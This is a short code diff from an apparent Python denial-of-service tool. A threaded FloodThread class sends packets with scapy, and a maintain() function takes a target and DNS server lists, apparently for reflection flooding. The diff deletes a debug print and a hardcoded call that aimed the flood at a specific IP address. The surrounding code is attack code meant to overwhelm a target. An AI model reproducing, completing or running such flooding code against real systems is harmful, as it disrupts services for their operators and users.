@@ -32,7 +32,7 @@ class FloodThread(threading.Thread):
         send(p, inter=0, verbose=0)
         global packets
         packets += 1 
-        # print(packets)
+
 
 
 def maintain(target, dns_servers = read_servers()[0], timeout=10, threads=20):
@@ -50,8 +50,4 @@ def maintain(target, dns_servers = read_servers()[0], timeout=10, threads=20):
                 flood_threads[i].join()
             break
     return packets
-    
-print(maintain('157.240.205.35'))
-# if __name__ == '__main__':
-#     main()
-#     FloodThread
+
